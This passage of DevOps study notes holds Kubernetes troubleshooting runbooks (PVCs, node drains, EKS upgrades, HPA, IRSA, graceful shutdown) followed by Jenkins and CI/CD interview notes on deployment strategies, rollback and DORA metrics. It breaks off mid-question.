# OR better: use HPA for CoreDNS based on CPU

# STEP 7: Check ndots issue (too many DNS queries)
# Default ndots=5 causes extra queries for short names
# api.stripe.com (2 dots) → tries 4 search domains first
# FIX in pod spec:
#   dnsConfig:
#     options:
#     - name: ndots
#       value: "2"
```

### Runbook: PVC Stuck in Pending

```bash
# ═══════════════════════════════════════════════════════════
# RUNBOOK: PVC STUCK IN PENDING
# ═══════════════════════════════════════════════════════════

# STEP 1: Check PVC events
kubectl describe pvc <pvc-name> -n <namespace>

# DIAGNOSIS BY EVENT MESSAGE:

# "waiting for first consumer to be created"
#   NORMAL with WaitForFirstConsumer.
#   PV won't be created until a pod using this PVC is scheduled.
#   ACTION: create a pod that uses this PVC.

# "storageclass.storage.k8s.io 'xxx' not found"
#   StorageClass doesn't exist.
#   ACTION: kubectl get sc → create the missing StorageClass.

# "failed to provision volume with StorageClass"
#   CSI driver error.
#   ACTION: check CSI controller logs:
    kubectl logs -n kube-system -l app=ebs-csi-controller -c csi-provisioner --tail=50

# "no persistent volumes available for this claim"
#   Static provisioning: no PV matches PVC requirements.
#   Check: access mode, storage size, StorageClass name, labels.

# STEP 2: Check CSI driver health
kubectl get pods -n kube-system | grep ebs-csi
# ebs-csi-controller-xxx   Running (should be 2 replicas)
# ebs-csi-node-xxx         Running (one per node)

# Check IRSA permissions for CSI controller
kubectl describe sa ebs-csi-controller-sa -n kube-system
# Should have eks.amazonaws.com/role-arn annotation
# IAM role needs: ec2:CreateVolume, ec2:AttachVolume, etc.

# STEP 3: Check AWS limits
# EC2 volume limits per instance type (max EBS volumes attachable)
# m5.xlarge: 25 EBS volumes max
# If node has 25 volumes → no more PVs can attach → pod stuck

# STEP 4: Force provision (last resort)
# Delete and recreate PVC
kubectl delete pvc <pvc-name> -n <namespace>
# ⚠️ Data loss if reclaim policy is Delete!
# If Retain: PV and data still exist, can rebind manually
```

## C.4 Cordon, Drain & Upgrade — Extended Procedures

### Safe Node Maintenance Procedure

```bash
# ═══════════════════════════════════════════════════════════
# SAFE NODE MAINTENANCE PROCEDURE
# ═══════════════════════════════════════════════════════════

# STEP 1: Pre-checks
kubectl get pdb -A
# Verify ALLOWED DISRUPTIONS > 0 for all PDBs
# If any PDB shows 0 → investigate before proceeding

kubectl get pods -o wide --field-selector=spec.nodeName=worker-3
# Review what's running on the target node
# Any bare pods without controllers? They'll be deleted permanently!

# STEP 2: Cordon (prevent new scheduling)
kubectl cordon worker-3
kubectl get nodes
# worker-3   Ready,SchedulingDisabled

# STEP 3: Drain (evict pods respecting PDBs)
kubectl drain worker-3 \
  --ignore-daemonsets \
  --delete-emptydir-data \
  --timeout=300s \
  --grace-period=60

# Monitor drain progress
kubectl get pods -o wide --field-selector=spec.nodeName=worker-3 -w

# STEP 4: If drain is stuck
kubectl get events -A --field-selector reason=FailedEviction
# "Cannot evict pod as it would violate the pod's disruption budget"

# Options:
# a) Wait — replacement pods are starting elsewhere
# b) Scale up first: kubectl scale deployment <x> --replicas=+1
# c) Emergency: kubectl drain worker-3 --force (bypasses PDB!)

# STEP 5: Perform maintenance
# (kernel update, instance type change, AMI update, etc.)

# STEP 6: Uncordon
kubectl uncordon worker-3
kubectl get nodes
# worker-3   Ready
```

### EKS Managed Node Group Upgrade — Step by Step

```bash
# ═══════════════════════════════════════════════════════════
# EKS MANAGED NODE GROUP UPGRADE
# ═══════════════════════════════════════════════════════════

# STEP 1: Upgrade control plane first
aws eks update-cluster-version \
  --name my-cluster \
  --kubernetes-version 1.30

# Monitor (takes 20-40 minutes)
aws eks describe-update \
  --name my-cluster \
  --update-id <update-id>

# STEP 2: Update add-ons to compatible versions
aws eks update-addon --cluster-name my-cluster \
  --addon-name vpc-cni --resolve-conflicts OVERWRITE

aws eks update-addon --cluster-name my-cluster \
  --addon-name coredns --resolve-conflicts OVERWRITE

aws eks update-addon --cluster-name my-cluster \
  --addon-name kube-proxy --resolve-conflicts OVERWRITE

aws eks update-addon --cluster-name my-cluster \
  --addon-name aws-ebs-csi-driver --resolve-conflicts OVERWRITE

# STEP 3: Update node groups
aws eks update-nodegroup-version \
  --cluster-name my-cluster \
  --nodegroup-name workers \
  --launch-template name=my-template,version=\$Latest

# What happens:
# 1. New nodes launched with new AMI (K8s 1.30)
# 2. Old nodes cordoned
# 3. Old nodes drained (respects PDBs)
# 4. Pods reschedule to new nodes
# 5. Old nodes terminated
# Total time: 15-45 minutes depending on pod count

# STEP 4: Monitor the upgrade
kubectl get nodes -w
# Watch old nodes become NotReady/SchedulingDisabled
# Watch new nodes become Ready

kubectl get pods -A | grep -v Running
# All pods should be Running after upgrade

# STEP 5: Verify
kubectl get nodes -o wide
# All nodes on new version
kubectl version --short
# Server Version: v1.30.x
```

## C.5 HPA Advanced — Custom Metrics & Scaling Behavior

### HPA with Prometheus Custom Metrics

```yaml
# ═══════════════════════════════════════════════════════════
# HPA WITH CUSTOM METRICS (via Prometheus Adapter)
# ═══════════════════════════════════════════════════════════

# Step 1: Install Prometheus Adapter
# It translates Prometheus metrics into K8s custom metrics API

# Step 2: Configure custom metric rule in Prometheus Adapter
apiVersion: v1
kind: ConfigMap
metadata:
  name: adapter-config
data:
  config.yaml: |
    rules:
    - seriesQuery: 'http_requests_total{namespace!="",pod!=""}'
      resources:
        overrides:
          namespace: {resource: "namespace"}
          pod: {resource: "pod"}
      name:
        matches: "^(.*)_total$"
        as: "${1}_per_second"
      metricsQuery: 'rate(<<.Series>>{<<.LabelMatchers>>}[2m])'

# Step 3: HPA using custom metric
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: api-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: api
  minReplicas: 3
  maxReplicas: 100
  metrics:
  # Primary: custom metric (requests per second per pod)
  - type: Pods
    pods:
      metric:
        name: http_requests_per_second
      target:
        type: AverageValue
        averageValue: "1000"     # scale when > 1000 rps per pod

  # Secondary: CPU as safety net
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70

  # External metric: SQS queue depth (scale based on backlog)
  - type: External
    external:
      metric:
        name: sqs_approximate_number_of_messages_visible
        selector:
          matchLabels:
            queue_name: order-processing
      target:
        type: Value
        value: "100"    # scale when queue > 100 messages

  behavior:
    scaleUp:
      stabilizationWindowSeconds: 0      # react immediately
      policies:
      - type: Percent
        value: 100                        # double pods if needed
        periodSeconds: 15
      - type: Pods
        value: 10                         # but max 10 pods per 15s
        periodSeconds: 15
      selectPolicy: Max                  # use whichever allows more

    scaleDown:
      stabilizationWindowSeconds: 300    # wait 5 min before scaling down
      policies:
      - type: Percent
        value: 10                        # max 10% reduction per minute
        periodSeconds: 60
      selectPolicy: Max
```

### HPA Debugging

```bash
# Check HPA status
kubectl get hpa -n production
# NAME     REFERENCE     TARGETS          MINPODS  MAXPODS  REPLICAS
# api-hpa  Deployment/api  75%/70%,850/1k  3        100      8

# Detailed HPA conditions
kubectl describe hpa api-hpa -n production
# Look for:
# ScalingActive: True/False
# AbleToScale: True/False
# ScalingLimited: True (hit max/min)

# Common HPA issues:
# "unable to get metrics for resource cpu"
#   → metrics-server not running or pod has no CPU request
#   kubectl get pods -n kube-system | grep metrics-server

# "failed to get external metric"
#   → Prometheus adapter not running or metric name mismatch
#   kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1" | jq .

# "target utilization 0%"
#   → Pod CPU request is 0 (not set). HPA can't calculate percentage.
#   FIX: set CPU requests on all containers in the deployment.

# Test custom metrics API
kubectl get --raw "/apis/custom.metrics.k8s.io/v1beta1/namespaces/production/pods/*/http_requests_per_second" | jq .
```

## C.6 ConfigMap & Secret — Update Propagation

### How Updates Propagate to Pods

```
═══════════════════════════════════════════════════════════════
CONFIGMAP / SECRET UPDATE PROPAGATION
═══════════════════════════════════════════════════════════════

INJECTION METHOD          AUTO-UPDATE?  DELAY        RESTART NEEDED?
─────────────────────────────────────────────────────────────────────
Environment variable      NO            N/A          YES — always
Volume mount             YES           ~60 seconds   NO — if app re-reads
  (subPath mount)        NO            N/A          YES — subPath breaks sync
Immutable ConfigMap       N/A           N/A          Must create new CM + restart

WHY VOLUME UPDATES TAKE ~60 SECONDS:
  Kubelet syncs ConfigMap/Secret volumes on a periodic interval.
  Default: syncFrequency=1m + kubelet cache TTL
  Total latency: 30-90 seconds typically

SUBPATH BREAKS AUTO-UPDATE:
  volumeMounts:
  - name: config
    mountPath: /etc/myapp/config.yaml
    subPath: config.yaml          # ← THIS breaks auto-update!
  
  subPath creates a bind-mount of ONE file, not the whole directory.
  Bind-mounts don't get updated when the source changes.
  FIX: mount entire directory, or accept restart-based updates.

IMMUTABLE CONFIGMAPS/SECRETS (K8s 1.21+):
  apiVersion: v1
  kind: ConfigMap
  metadata:
    name: app-config-v3
  immutable: true       # ← cannot be changed after creation
  data:
    key: value

  Benefits:
  • Kubelet skips periodic sync checks → lower API server load
  • Prevents accidental changes to production config
  • Update strategy: create new CM with new name, update Deployment
    to reference new CM → rolling update picks up new config
```

### Reloader Pattern — Automated Restarts on Config Changes

```yaml
# Stakater Reloader: watches Secrets/ConfigMaps, triggers rolling restart

# Install
# helm install reloader stakater/reloader -n reloader --create-namespace

# Annotate Deployment to watch specific resources
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  annotations:
    # Watch specific secret (restart when it changes):
    secret.reloader.stakater.com/reload: "db-credentials,tls-cert"
    
    # Watch specific configmap:
    configmap.reloader.stakater.com/reload: "app-config"
    
    # Watch ALL referenced secrets and configmaps:
    reloader.stakater.com/auto: "true"

# HOW IT WORKS:
# 1. Reloader watches K8s Secret/ConfigMap objects for changes
# 2. When watched object changes → Reloader patches the Deployment
#    with a new annotation (hash of the changed resource)
# 3. Annotation change triggers rolling restart
# 4. New pods start with updated secret/configmap values

# COMBINED WITH ESO:
# AWS SM rotates secret → ESO syncs to K8s Secret →
# Reloader detects change → triggers rolling restart →
# New pods have new credentials
# Full automation with ~refreshInterval delay
```

## C.7 IRSA Troubleshooting — Common Failures

```bash
# ═══════════════════════════════════════════════════════════
# IRSA TROUBLESHOOTING GUIDE
# ═══════════════════════════════════════════════════════════

# SYMPTOM: Pod gets "AccessDenied" or "No credentials" when calling AWS APIs

# STEP 1: Verify IRSA webhook is injecting env vars
kubectl get pod <pod-name> -o yaml | grep -A 2 "AWS_"
# Should see:
# - name: AWS_ROLE_ARN
#   value: arn:aws:iam::123456789012:role/MyRole
# - name: AWS_WEB_IDENTITY_TOKEN_FILE
#   value: /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# If NOT present:
#   → ServiceAccount missing eks.amazonaws.com/role-arn annotation
#   → IRSA webhook (pod-identity-webhook) not running
#   → Pod not using the annotated ServiceAccount

# STEP 2: Verify token file exists inside pod
kubectl exec -it <pod-name> -- ls -la /var/run/secrets/eks.amazonaws.com/serviceaccount/
# Should see: token (projected SA token)

# STEP 3: Verify STS assumption works
kubectl exec -it <pod-name> -- aws sts get-caller-identity
# Should return: assumed-role/MyRole/botocore-session-...
# If "Unable to locate credentials": SDK not finding the token
# If "AccessDenied": trust policy issue

# STEP 4: Check IAM trust policy
aws iam get-role --role-name MyRole --query 'Role.AssumeRolePolicyDocument'
# Trust policy must have:
#   Principal.Federated: arn:aws:iam::ACCOUNT:oidc-provider/OIDC_URL
#   Condition.StringEquals:
#     OIDC_URL:sub: system:serviceaccount:NAMESPACE:SA_NAME
#     OIDC_URL:aud: sts.amazonaws.com

# COMMON MISTAKES:
# 1. Wrong namespace in trust policy condition
# 2. Wrong service account name in trust policy
# 3. OIDC provider not associated with EKS cluster
# 4. Pod using 'default' SA instead of annotated SA
# 5. AWS SDK version too old (doesn't support web identity token)
# 6. Regional STS endpoint not enabled (add annotation:
#    eks.amazonaws.com/sts-regional-endpoints: "true")
```

## C.8 Graceful Shutdown — Zero-Downtime Termination

```
═══════════════════════════════════════════════════════════════
ZERO-DOWNTIME POD TERMINATION — COMPLETE PATTERN
═══════════════════════════════════════════════════════════════

THE RACE CONDITION PROBLEM:
  T+0s: Pod deletion initiated
        Two things happen SIMULTANEOUSLY:
        1. Kubelet: starts preStop hook, then SIGTERM
        2. EndpointSlice controller: removes pod from endpoints
        3. kube-proxy: propagates iptables changes to ALL nodes

  BUT: kube-proxy propagation takes 1-5 seconds across the cluster!
  During that window: some nodes still have old iptables rules
  → NEW connections still arrive at the terminating pod
  → If app already stopped listening → CONNECTION REFUSED → ERRORS

THE FIX — preStop sleep:
  lifecycle:
    preStop:
      exec:
        command: ["sleep", "5"]    # wait for kube-proxy propagation

  TIMELINE WITH FIX:
  T+0s:  Pod deletion initiated
  T+0s:  preStop hook starts (sleep 5)
  T+0-5s: kube-proxy propagates endpoint removal across all nodes
  T+5s:  preStop completes → SIGTERM sent to app
  T+5s:  App begins graceful drain (finish in-flight requests)
  T+5-55s: App drains requests, closes connections
  T+60s: terminationGracePeriodSeconds expires → SIGKILL

  REQUIREMENTS:
  terminationGracePeriodSeconds: 60     # ≥ preStop + drain time
  preStop: sleep 5                       # wait for endpoint propagation
  App handles SIGTERM: stop accepting, finish in-flight, exit 0

PRODUCTION DEPLOYMENT YAML:
```

```yaml
spec:
  terminationGracePeriodSeconds: 60
  containers:
  - name: app
    lifecycle:
      preStop:
        exec:
          command: ["/bin/sh", "-c", "sleep 5"]
    # App must handle SIGTERM:
    # 1. Stop accepting new connections
    # 2. Finish processing in-flight requests
    # 3. Close database connections
    # 4. Flush logs
    # 5. Exit 0
```

```
CONNECTION DRAINING FOR DIFFERENT FRAMEWORKS:
  Go:     srv.Shutdown(ctx) with context timeout
  Node:js: server.close() + process.on('SIGTERM', handler)
  Java:   Runtime.addShutdownHook() or Spring graceful shutdown
  Python: signal.signal(SIGTERM, handler) + asyncio shutdown
  nginx:  worker_shutdown_timeout 30s (built-in SIGTERM handling)
```

# CI/CD + Jenkins — Production-Grade Interview Notes
## Jenkins on EKS | Kubernetes Pod Agents | AWS Secrets Manager | GitOps + Traditional CI/CD

---

# 1. CI/CD FUNDAMENTALS

---

## 1.1 What is CI/CD

**Concept:** CI/CD stands for Continuous Integration / Continuous Delivery (or Deployment). It is a set of engineering practices and automated pipelines that allow teams to integrate code changes frequently, automatically build, test, and validate every change, and deliver software to production faster, safer, and more reliably.

**Why it is used:** Before CI/CD, teams faced integration hell (merging after weeks of isolation), long release cycles (3–6 month deployments), manual testing bottlenecks, fear of deployment, and environment drift ("works on my machine"). CI/CD solves all of this by automating the path from code commit to production with fast feedback loops at every step.

**How it works:**

```
Developer writes code → git push → CI Server detects change (webhook)
  → Pipeline triggered automatically
  → CI PHASE: checkout → dependencies → lint → unit tests → build artifact → integration tests → security scans → publish artifact
  → CD PHASE: deploy staging → smoke tests → approval gate (optional) → deploy production → post-deploy verification → monitoring
  → Feedback to developer (pass/fail)
```

**Important details / best practices:**
- Pipeline should be fast — under 10 minutes for CI ideally
- Broken builds are the team's #1 priority to fix
- Artifact produced in CI must be immutable — the exact same binary passes staging and is deployed to production, never rebuilt
- Secrets management is non-negotiable — never hardcode credentials
- Environment parity (dev ≈ staging ≈ prod configuration) is essential

**Interview insights:**
- "CI/CD is a practice AND automation pipeline that allows developers to integrate code changes frequently — multiple times a day — and have those changes automatically built, tested, and deployed to production. CI validates code through automated builds and tests. CD takes the validated artifact and automates delivery to environments up to production. The goal is to eliminate manual toil, reduce integration risk, shorten feedback loops, and increase deployment frequency while maintaining quality."
- A good pipeline is: Fast, Reliable (low flakiness), Repeatable, Visible, Secure (no hardcoded secrets), and Maintainable (Pipeline as Code, Shared Libraries).
- Flaky tests are the silent killer of CI/CD — they destroy trust in the pipeline. Teams start ignoring red builds.

**Common interview questions:**

**Q: What is the difference between a build pipeline and a deployment pipeline?**
> A build pipeline focuses on CI — compiling code, running tests, producing a versioned artifact. A deployment pipeline extends this into CD — taking the artifact and deploying it through environments (staging → production). In practice, they're combined into one end-to-end pipeline. The artifact produced in CI is immutable — the same binary that passes staging is deployed to production.

**Q: What makes a CI/CD pipeline "good"?**
> Fast (under 10 min for CI), Reliable (low flakiness), Repeatable (same result for same input), Visible (clear status, logs, notifications), Secure (no hardcoded secrets, least-privilege agents), and Maintainable (Pipeline as Code, DRY shared libraries). A pipeline that's slow, flaky, or opaque defeats its own purpose.

**Q: Why is a fast feedback loop important?**
> The faster a developer knows their code broke something, the cheaper the fix. If a build takes 45 minutes, developers context-switch. When the failure arrives, they've lost context. Studies show >10 minute builds significantly reduce CI benefits. Fast feedback enables higher commit frequency — the foundation of trunk-based development.

## 1.2 CI vs Continuous Delivery vs Continuous Deployment

**Concept:** Three distinct but related practices, often confused because they share the "CD" abbreviation.

| Term | Core Idea |
|------|-----------|
| Continuous Integration (CI) | Automatically build and test every code change |
| Continuous Delivery (CD) | Code is always in a deployable state; deploy with one click (human gate) |
| Continuous Deployment (CD) | Every passing change deploys to production automatically — no human gate |

**The key distinction:** Continuous Delivery requires a human decision to deploy. Continuous Deployment eliminates that decision entirely.

**Why it matters:**
- CI solves integration risk from infrequent merges
- Continuous Delivery solves manual, risky deployments and slow time-to-market
- Continuous Deployment eliminates human approval bottlenecks for maximum deployment frequency

Not every team needs Continuous Deployment. Regulated industries (finance, healthcare) often cannot auto-deploy and practice Continuous Delivery instead.

**Important details:**
- Continuous Deployment requires exceptional test coverage, feature flags, automated rollback, and robust monitoring
- You cannot do Continuous Deployment responsibly without these prerequisites
- In Jenkins: Continuous Delivery uses `input` steps before production; Continuous Deployment removes them

**Interview insights:**
- "The critical distinction is the human gate. Continuous Delivery means every commit is deployable and a human decides when to release. Continuous Deployment means every commit that passes the pipeline is automatically deployed to production. Most organizations practice Continuous Delivery — it provides the automation benefits while retaining human oversight for risk management."

---

## 1.3 The Software Delivery Pipeline

**Concept:** The automated sequence of stages that code goes through from commit to production.

**How it works:**

```
Source Stage → Build Stage → Test Stage → Artifact Stage → Staging Stage → Approval Gate → Production Stage
```

**Key design principles:**
1. **Fail Fast** — cheapest checks first (lint → unit → integration → e2e)
2. **Artifact Immutability** — build once, deploy many times. Tag with git SHA: `myservice:2.4.1-a3f1c9b`
3. **Environment Parity** — staging mirrors production; config differences only
4. **Pipeline Observability** — every stage produces logs, metrics, status
5. **Parallelism** — independent stages run concurrently to reduce total time

**Artifact versioning strategy:**

```
Format: <app-name>:<semantic-version>-<build-number>-<git-sha>
Example: myservice:2.4.1-42-a3f1c9b
Never use :latest in production pipelines
```

**Interview insights:**
- Each stage acts as a quality gate — if it fails, the pipeline stops
- Secret leakage through artifacts is a real risk — use multi-stage Docker builds and secret mounts
- Artifact registry space management with retention policies must be configured from day one

---

## 1.4 Pipeline as Code

**Concept:** Defining CI/CD pipelines in version-controlled files (Jenkinsfiles, `.gitlab-ci.yml`, GitHub Actions workflows) rather than in a GUI.

**Why it is used:** Version history, PR-based review, rollback capability, disaster recovery, bootstrapping new projects instantly. It's a core DevOps principle.

**Three levels of "as Code" in CI/CD:**

```
Level 1: Pipeline as Code     → Jenkinsfile (what the pipeline does)
Level 2: Infrastructure as Code → Terraform, Helm (where it runs)
Level 3: Config as Code        → JCasC, Ansible (how Jenkins itself is configured)
```

**Jenkins Shared Libraries — DRY at the organization level:**

```
jenkins-shared-library/
├── vars/
│   ├── dockerBuild.groovy
│   ├── deployToKubernetes.groovy
│   └── notifySlack.groovy
└── src/
    └── com/company/
        └── PipelineUtils.groovy
```

```groovy
// In any Jenkinsfile:
@Library('jenkins-shared-library') _
pipeline {
    stages {
        stage('Build') {
            steps { dockerBuild(imageName: 'myapp', tag: env.GIT_COMMIT) }
        }
        stage('Deploy') {
            steps { deployToKubernetes(namespace: 'staging', image: "myapp:${env.GIT_COMMIT}") }
        }
    }
}
```

**Interview insights:**
- Secrets in Jenkinsfiles is the most common Pipeline as Code mistake — use `credentials()` binding or Vault
- Without Shared Libraries, every team diverges — some have security scanning, some don't
- Testing Jenkinsfiles: use `jenkins-pipeline-unit`, `Replay` feature, or a development Jenkins instance

## 1.5 Deployment Strategies

**Concept:** How new versions of software are released to production, determining risk, rollback speed, user experience, and infrastructure requirements.

### Recreate
```
Kill all v1 → Start all v2
Downtime guaranteed. Simple. No version compatibility issues.
Use: dev/test environments, jobs that can't run multiple versions.
```

### Rolling Update (Kubernetes default)
```
[v1][v1][v1][v1] → [v2][v1][v1][v1] → [v2][v2][v2][v2]
No downtime. Mixed versions temporarily. Rollback = another rolling update (slow).
App must handle API compatibility during transition.
```

```yaml
# Kubernetes Rolling Update
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 2
      maxUnavailable: 1
```

### Blue/Green
```
Traffic → Blue (v1) [live]    Green (v2) [tested, standing by]
Switch: Traffic → Green (v2)  Blue (v1) [warm for rollback]
Rollback: instant switch back to Blue
Infrastructure cost: 2x during deployment
```

### Canary
```
100% → v1
 95% → v1 | 5% → v2 (canary) → monitor metrics
 75% → v1 | 25% → v2 → metrics good
  0% → v1 | 100% → v2 (complete)
If metrics degrade: 100% → v1 (rollback)
```

**Interview insights:**
- Canary requires sophisticated traffic management (Istio, NGINX, AWS ALB) and observability
- Blue/Green's hardest problem is database migrations — both environments share the DB
- PodDisruptionBudget ensures minimum pods stay available during rolling updates
- Shadow traffic is a related concept: duplicate requests to new version without serving real users

**Common interview questions:**

**Q: Which deployment strategy would you choose for a high-traffic e-commerce checkout service?**
> Canary with automated analysis. Checkout is revenue-critical — any downtime or degraded experience directly impacts revenue. I'd route 5% of traffic to the new version, monitor error rate, p99 latency, and business metrics (conversion rate, cart abandonment) for 15 minutes. Only auto-promote if all metrics are within tolerance. Automated rollback if any metric degrades. Blue/Green is the alternative — it gives instant rollback but requires 2x infrastructure and doesn't validate with real traffic before full rollout.

**Q: How do you implement canary on Kubernetes?**
> Three approaches: (1) Argo Rollouts — define a Rollout resource with canary strategy, integrates with Istio/NGINX for traffic splitting, queries Prometheus/Datadog for automated analysis. (2) Istio VirtualService — manually configure traffic weights between v1 and v2 Service subsets. (3) NGINX Ingress canary annotations — `nginx.ingress.kubernetes.io/canary-weight: "10"`. Argo Rollouts is recommended because it automates the entire progression and rollback.

**Q: What is a PodDisruptionBudget and why does it matter for deployments?**
> A PDB specifies the minimum number of pods that must remain available during voluntary disruptions (rolling updates, node drains). Without it, a rolling update could simultaneously terminate too many pods, causing downtime. Example: `minAvailable: 3` ensures at least 3 pods serve traffic while others are being replaced. This is critical for zero-downtime rolling updates.

```yaml
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: myapp-pdb
spec:
  minAvailable: 3
  selector:
    matchLabels:
      app: myapp
```

## 1.6 Rollback Strategies

**Concept:** How to revert to a previous version when a deployment causes issues.

**Rollback mechanisms (fastest to slowest):**
1. **Feature flags** — disable feature in milliseconds, no redeployment
2. **Blue/Green switch** — instant traffic switch back to old environment
3. **Kubernetes `kubectl rollout undo`** — redeploys previous pod spec
4. **Redeploy previous artifact** — full pipeline run with previous version

**The hardest scenario — database migrations already ran:**
- Design all migrations to be backward-compatible using Expand/Contract pattern
- Phase 1: add new structure without removing old (code rollback safe)
- If destructive migration ran: roll forward with a fix, or run a compensating migration
- Never deploy destructive migrations in the same release as dependent code

**Rollback vs Roll-forward:**
- Rollback: revert to previous version. Best when bug is unknown/complex, time pressure extreme
- Roll-forward: fix bug and deploy new version. Best when bug is well-understood, DB migrations prevent clean rollback

**Interview insights:**
- "We can always rollback" is often false — if you didn't preserve the previous artifact in your registry, you can't
- Rollback doesn't undo side effects (Kafka messages, emails sent)
- Cache poisoning during rollback: v2 wrote data in new format to Redis; v1 can't read it
- `kubectl rollout undo` does NOT reverse ConfigMap, Secret, or DB migration changes
- Rollback should be tested regularly (Game Days, Chaos Engineering)

**Common interview questions:**

**Q: Walk through a production rollback scenario on Kubernetes.**
> (1) Incident detected via monitoring alert (error rate spike). (2) On-call verifies: is this from the latest deployment? Check deployment timestamp vs incident start. (3) If using Helm with `--atomic`: Helm already auto-rolled back if the deployment failed health checks. If the deployment succeeded but the app has a logic bug: `helm rollback myapp 1 -n production` (reverts to previous release). (4) Verify rollback: `kubectl rollout status deployment/myapp -n production`. (5) Check application health: hit health endpoint, verify error rate is decreasing. (6) Post-incident: determine root cause, write fix, go through normal CI/CD to redeploy.

**Q: How do feature flags relate to rollback?**
> Feature flags are the fastest rollback mechanism — disable a flag in milliseconds without any deployment. I treat flags as the first line of defense: if a new feature is behind a flag, any issue is resolved by disabling it. No redeployment, no DB concerns, zero downtime. This is why I recommend wrapping all non-trivial new features in flags during Continuous Deployment. After confidence is established (days/weeks), the flag is removed.

**Q: What's the difference between Helm rollback and Kubernetes rollout undo?**
> `helm rollback` reverts the entire Helm release — including ConfigMaps, Services, Ingress rules, and the Deployment spec — to a previous release version. It uses Helm's release history. `kubectl rollout undo deployment/myapp` only reverts the Deployment's pod template (container image, env vars, resource limits) to the previous revision. It does NOT touch ConfigMaps, Services, or other resources. For Helm-managed deployments, always use `helm rollback` because it restores the complete state.

**Rollback decision tree:**
```
Issue detected in production
  │
  ├── Feature behind flag? → Disable flag (seconds) ✅
  │
  ├── Code bug, no DB migration ran?
  │     ├── Blue/Green? → Switch traffic to Blue (instant) ✅
  │     ├── Helm? → helm rollback (1-2 minutes) ✅
  │     └── GitOps? → git revert + push (1-3 minutes) ✅
  │
  ├── Code bug, backward-compatible migration ran?
  │     → Rollback code only (safe — old code works with new schema) ✅
  │
  └── Code bug, destructive migration ran?
        ├── Can fix quickly? → Roll FORWARD with hotfix
        ├── Data integrity intact? → Run compensating migration + rollback code
        └── Data corrupt? → Restore from DB backup (data loss) ⚠️
```

## 1.7 DORA Metrics

**Concept:** Four research-backed metrics from DevOps Research and Assessment (DORA) that measure software delivery performance and predict business outcomes.

| Metric | What It Measures | Elite |
|--------|-----------------|-------|
| Deployment Frequency | How often you deploy to production | Multiple times/day |
| Lead Time for Changes | Time from commit to production | < 1 hour |
| Mean Time to Recovery (MTTR) | Time to restore after production failure | < 1 hour |
| Change Failure Rate | % of deployments causing production failure | 0-15% |

**The critical insight:** Speed and stability are NOT a tradeoff. Elite teams have both. High deployment frequency enables smaller batch sizes, which improves stability.

**Why small batches improve stability:**
```
Large batches (deploy monthly): 1000 commits/deployment → which caused failure? → Slow MTTR
Small batches (deploy hourly):  5 commits/deployment → easy investigation → Fast MTTR
```

**Interview insights:**
- If asked to improve one metric, choose Lead Time — improving it requires improving everything else
- 0% Change Failure Rate is NOT a good target — creates perverse incentives to deploy less
- "Failure" = deployment requiring hotfix, rollback, or causing user-facing incident (not failed pipeline runs)
- DORA doesn't measure everything — security posture, tech debt, developer experience are not captured

**Common interview questions:**

**Q: How do DORA metrics connect to SRE work?**
> MTTR is tied to SRE incident management and runbook quality. Change Failure Rate maps to error budgets — if 30% of deployments cause failures, your error budget drains rapidly. Deployment Frequency reflects SRE's goal of reducing risk through smaller batch sizes. Lead Time reflects pipeline efficiency which SREs often own. I'd treat DORA as leading indicators: if Lead Time increases, the pipeline is bottlenecking; if Change Failure Rate rises, testing or canary analysis needs improvement.

**Q: A team's MTTR is 4 hours and Change Failure Rate is 35%. What would you fix first?**
> Change Failure Rate first — you're deploying broken code too often. Investigate: are tests insufficient (shift-left with better coverage), is canary analysis missing (add automated canary with metric checks), or is staging too different from production (environment parity)? Reducing CFR also reduces MTTR indirectly because there are fewer incidents to recover from.

**Q: How do you measure DORA in practice?**
> Deployment Frequency: count production deployments from deployment tracking system. Lead Time: commit timestamp to deployment timestamp from pipeline metadata. Change Failure Rate: incidents correlated to deployments within a time window. MTTR: incident detection time to resolution time from incident management system. Tools: Jenkins Prometheus plugin + Grafana dashboards, or dedicated platforms like Sleuth, Swarmia, LinearB.

**DORA and CI/CD investment justification (business language):**
```
Before CI/CD investment:           After investment:
  Deploy: Weekly                     Deploy: 5x daily
  Lead Time: 2 weeks                 Lead Time: 2 hours
  MTTR: 4 hours                      MTTR: 30 minutes
  CFR: 25%                           CFR: 8%

Business impact:
  Features reach users 7x faster
  Incidents resolved 8x faster
  3x fewer production failures
```

# 2. JENKINS ARCHITECTURE (EKS CONTEXT)

---

## 2.1 Controller + Agents + Executors

**Concept:** Jenkins uses a Controller-Agent architecture where the Controller orchestrates (scheduling, configuration, UI, API) and Agents execute the actual builds.

**How it works:**
```
CONTROLLER (one instance — runs on EKS as a Deployment with PVC)
  ├── Scheduler: assigns builds to agents based on labels
  ├── Build Queue: holds pending builds
  ├── Configuration: system config, job definitions, credentials
  ├── UI/API: web interface, REST API
  └── Executors: 0 in production (CRITICAL — controller never runs builds)

AGENTS (dynamic Kubernetes pods via Kubernetes plugin)
  ├── Created per-build, destroyed after
  ├── Each pod = one executor typically
  ├── Labeled for routing (java, docker, deploy)
  └── Connect to Controller via JNLP (TCP 50000 or WebSocket)
```

**Important details:**
- Controller executors MUST be 0 in production — builds on the Controller block the scheduler, risk JVM OOM, and compromise security
- Each Executor is one "slot" that can run one build simultaneously
- An Agent can have multiple executors (static agents), but Kubernetes agents typically have 1

**Interview insights:**
- "The Controller is the scheduling brain, not the execution engine. Setting Controller executors to 0 is the single most important production configuration."
- The Controller is a SPOF — no native HA. Use PVC on EKS + JCasC + backups for DR.

**Common interview questions:**

**Q: Why should Controller executors be 0?**
> Three reasons: (1) Security — builds on the Controller run with Jenkins process permissions, accessing JENKINS_HOME directly including credentials and secrets. (2) Stability — builds consume Controller CPU/memory, starving the scheduler, UI, and API. A memory-hungry build can OOM the Controller, crashing all of Jenkins. (3) Scalability — Controller CPU should be dedicated to orchestration, not execution.

**Q: How does an agent connect to the Controller?**
